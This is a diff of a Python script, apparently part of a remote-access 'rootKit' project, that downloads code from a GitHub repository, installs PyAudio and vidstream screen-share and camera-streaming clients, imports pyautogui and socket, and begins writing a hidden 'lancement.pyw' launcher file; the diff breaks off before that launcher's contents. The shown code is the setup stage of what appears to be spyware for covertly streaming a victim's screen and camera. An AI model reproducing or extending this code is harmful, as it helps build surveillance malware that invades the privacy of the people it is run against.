@@ -4,7 +4,7 @@ from shutil import move, rmtree
 from time import sleep
 from zipfile import ZipFile
 from requests import get
-from subprocess import Popen
+from subprocess import Popen, getoutput
 githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
 try:
     import easyimporting
@@ -32,24 +32,21 @@ def moveFileFromDir(data, file):
             move(getcwd().replace('\\', '/')+"/"+data+"/"+file [f], getcwd().replace('\\', '/'))
 
 try:
-    from vidstream import ScreenShareClient, CameraClient
-    raise Exception
+    import vidstream
 except:
     dir = "whl-main"
     downloadFileGithub("https://github.com/N0SAFE/whl/archive/refs/heads/main.zip")
-    Popen("py -m pip install whl-main/PyAudio-0.2.11-cp39-cp39-win_amd64.whl", shell=True)
+    print(getoutput("py -m pip install whl-main/PyAudio-0.2.11-cp39-cp39-win_amd64.whl"))
     rmtree("whl-main")
-    Popen("py -m pip install vidstream", shell=True)
-    remove("PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
-    
-exit()
+    print(getoutput("py -m pip install vidstream"))
+from vidstream import ScreenShareClient, CameraClient
 try:
     import pyautogui, socket, lib_platform, pyaudio
 except:
     easyimporting.importing("pyautogui lib_platform")
     system('dl.py')
     exit()
-
+exit()
 with open('lancement.pyw', 'w') as file:
     file.write("""
 from os import remove, chdir, mkdir
